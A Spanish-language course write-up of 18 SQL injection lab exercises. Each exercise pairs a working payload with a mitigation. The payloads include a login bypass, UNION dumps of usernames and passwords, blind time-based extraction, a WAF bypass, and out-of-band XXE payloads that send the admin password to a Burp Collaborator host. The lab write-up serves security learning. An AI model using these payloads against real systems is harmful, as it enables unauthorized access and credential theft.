Bienvenidos al módulo Road to Hall of Fame enfocado en SQL Injection. Este apartado presenta una arquitectura de progreso a través de los diversos laboratorios prácticos superados durante el curso. A continuación se documenta el progreso estructurado de los 18 retos vulnerables y analizados, detallando la evidencia, cargas maliciosas utilizadas (payloads) y las mitigaciones teóricas requeridas.

BLOQUE 1: SQLi Apprentice (Fundamentos)

1. Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

Apprentice
In-band (Boolean-based)

Objetivo: Visualizar productos no publicados de todas las categorías.

Explicación Técnica: La falta de validación en el parámetro category permite inyectar operadores lógicos para anular la restricción released = 1 en la consulta SQL.

Payload:
' OR 1=1--
Mitigación: Uso de consultas parametrizadas para evitar la interpretación de metacaracteres.

2. Lab: SQL injection vulnerability allowing login bypass

Apprentice
In-band (Auth Bypass)

Objetivo: Acceder a la cuenta administrator sin conocer la contraseña.

Explicación Técnica: El formulario de autenticación es vulnerable; al cerrar la cadena del nombre de usuario y comentar el resto, se omite la verificación del password.

Payload:
administrator'--
Mitigación: Implementar una API de persistencia segura y deshabilitar el uso de SQL dinámico en el login.

BLOQUE 2: Ataques de Unión (Exfiltración)

3. Lab: SQL injection UNION attack, determining the number of columns returned by the query

Practitioner
UNION-based

Objetivo: Identificar cuántas columnas maneja la consulta original mediante errores.

Explicación Técnica: Se utiliza ORDER BY para medir el índice de columnas hasta que el servidor devuelva un error, revelando la estructura interna.

Payload:
' ORDER BY 3--
Mitigación: Validación de entradas y uso de Web Application Firewalls (WAF) para detectar patrones de ordenamiento.

4. Lab: SQL injection UNION attack, finding a column containing text

Practitioner
UNION-based

Objetivo: Localizar una columna que acepte datos de tipo string para mostrar información.

Explicación Técnica: Se inyectan valores nulos y cadenas de texto en distintas posiciones para observar cuál es renderizada en el HTML.

Payload:
' UNION SELECT NULL,'abc',NULL--
Mitigación: Aplicar tipado fuerte en el backend para los parámetros recibidos.

5. Lab: SQL injection UNION attack, retrieving data from other tables

Practitioner
UNION-based

Objetivo: Extraer nombres de usuario y contraseñas de la tabla users.

Explicación Técnica: Una vez conocida la estructura (2 columnas de texto), se ejecuta un UNION SELECT para volcar la tabla de credenciales.

Payload:
' UNION SELECT username, password FROM users--
Mitigación: Restringir permisos de lectura del usuario de BD a tablas estrictamente necesarias.

6. Lab: SQL injection UNION attack, retrieving multiple values in a single column

Practitioner
UNION-based

Objetivo: Extraer múltiples datos en una sola columna usando delimitadores.

Explicación Técnica: Se utiliza la concatenación (específica del motor, ej. ||) para unir username y password en un solo resultado visual.

Payload:
' UNION SELECT NULL, username || '~' || password FROM users--
Mitigación: Sanitización de caracteres de unión y control de salida de datos (Output Encoding).

BLOQUE 3: Fingerprinting de Base de Datos

7. Lab: SQL injection attack, querying the database type and version on Oracle

Practitioner
In-band (Oracle)

Objetivo: Obtener la versión específica del servidor Oracle.

Explicación Técnica: Oracle requiere que toda consulta SELECT tenga un FROM; se consulta la tabla del sistema v`$version.

Payload:
' UNION SELECT banner, NULL FROM v`$version--
Mitigación: Deshabilitar el acceso público a vistas de administración y metadatos.

8. Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft

Practitioner
In-band (MySQL/MSSQL)

Objetivo: Identificar la versión en bases de datos que usan variables de sistema.

Explicación Técnica: Se utiliza la variable global @@version para extraer la información del entorno.

Payload:
' UNION SELECT @@version, NULL#
Mitigación: Supresión de errores detallados y banners de versión del servidor.

BLOQUE 4: Blind SQLi (Ciega)

9. Lab: Blind SQL injection with conditional responses

Practitioner
Blind (Boolean)

Objetivo: Extraer la contraseña del administrador letra por letra.

Explicación Técnica: La aplicación solo responde "Welcome back" si la consulta es exitosa; se usa lógica booleana para inferir caracteres.

Payload:
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
Mitigación: Implementar respuestas genéricas que no varíen según el resultado de la consulta.

10. Lab: Blind SQL injection with conditional errors

Practitioner
Blind (Error-based)

Objetivo: Exfiltrar datos forzando errores internos del servidor.

Explicación Técnica: Se provoca un error (ej. división por cero) condicionado a que una subconsulta sea verdadera.

Payload:
'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
Mitigación: Configurar el servidor para no mostrar stack traces o errores 500 personalizados.

11. Lab: Blind SQL injection with time delays

Practitioner
Blind (Time-based)

Objetivo: Confirmar vulnerabilidad mediante pausas en la respuesta del servidor.

Explicación Técnica: Se inyectan funciones de retardo (pg_sleep, WAITFOR DELAY) para verificar la ejecución de comandos sin respuesta visual.

Payload:
'; IF (1=1) WAITFOR DELAY '0:0:10'--
Mitigación: Monitorear tiempos de respuesta inusuales y usar consultas preparadas.

12. Lab: Blind SQL injection with time delays and information retrieval

Practitioner
Blind (Time-based)

Objetivo: Recuperar credenciales basándose en el tiempo de espera.

Explicación Técnica: Se instruye a la BD a esperar 10 segundos solo si un carácter de la contraseña coincide con la prueba.

Payload:
'%3bIF+(username='administrator'+AND+substring(password,1,1)='a')+WAITFOR+DELAY+'0:0:10'--
Mitigación: Implementar Rate Limiting para mitigar ataques de fuerza bruta por tiempo.

BLOQUE 5: Técnicas de Evasión y Out-of-Band

13. Lab: Blind SQL injection with out-of-band interaction

Practitioner
Out-of-band (OAST)

Objetivo: Confirmar vulnerabilidad mediante una solicitud externa DNS/HTTP.

Explicación Técnica: Se utiliza la base de datos para realizar una petición a un dominio controlado por el atacante (Burp Collaborator).

Payload:
'+UNION+SELECT+extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://ID.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual--
Mitigación: Restringir el tráfico saliente (egress) del servidor de base de datos.

14. Lab: Blind SQL injection with out-of-band data exfiltration

Practitioner
Out-of-band (OAST)

Objetivo: Extraer la contraseña del administrador fuera de banda.

Explicación Técnica: Similar al anterior, pero el subdominio de la petición DNS incluye el dato exfiltrado (la contraseña).

Payload:
'+UNION+SELECT+EXTRACTVALUE(xmltype('<%21entity+%25+remote+SYSTEM+"http://'+(SELECT+password+FROM+users+WHERE+username='administrator')+'.burpcollaborator.net/">%25remote%3b'),'/l')+FROM+dual--
Mitigación: Deshabilitar funciones de red en la base de datos si no son necesarias.

15. Lab: SQL injection with filter evasion via XML encoding

Practitioner
In-band (WAF Bypass)

Objetivo: Extraer credenciales evadiendo un Firewall (WAF).

Explicación Técnica: El WAF bloquea palabras clave SQL, pero no inspecciona dentro de entidades XML. Se usa Hackvertor para codificar el payload en hexadecimal.

Payload:
1 UNION SELECT NULL, username || '~' || password FROM users (Codificado en Hex XML)
Mitigación: Configurar el WAF para realizar inspección recursiva y decodificación de múltiples capas.

16. Lab: SQL injection vulnerability in UNION attack, listing the database contents on Oracle

Practitioner
UNION-based

Objetivo: Mapear tablas y columnas en un entorno Oracle.

Explicación Técnica: Uso de tablas de esquema como all_tables y all_tab_columns para descubrir la arquitectura de datos.

Payload:
' UNION SELECT table_name, NULL FROM all_tables--
Mitigación: Enmascaramiento de datos y restricción de acceso al catálogo del sistema.

17. Lab: SQL injection vulnerability in UNION attack, listing the database contents on non-Oracle databases

Practitioner
UNION-based

Objetivo: Listar tablas en MySQL/PostgreSQL/MSSQL.

Explicación Técnica: Consulta a la base de datos estándar information_schema.tables para extraer nombres de tablas creadas por el usuario.

Payload:
' UNION SELECT table_name, NULL FROM information_schema.tables--
Mitigación: Deshabilitar el acceso al information_schema para usuarios de aplicaciones web.

18. Lab: Visible error-based SQL injection

Practitioner
Error-based

Objetivo: Exfiltrar datos a través de mensajes de error visibles en la interfaz.

Explicación Técnica: Se provoca un error de conversión de datos que obliga a la base de datos a mostrar el resultado de una subconsulta dentro del mensaje de error.

Payload:
' AND CAST((SELECT password FROM users LIMIT 1) AS int)--
Mitigación: Desactivar la visualización de errores detallados en producción (Display Errors = Off).
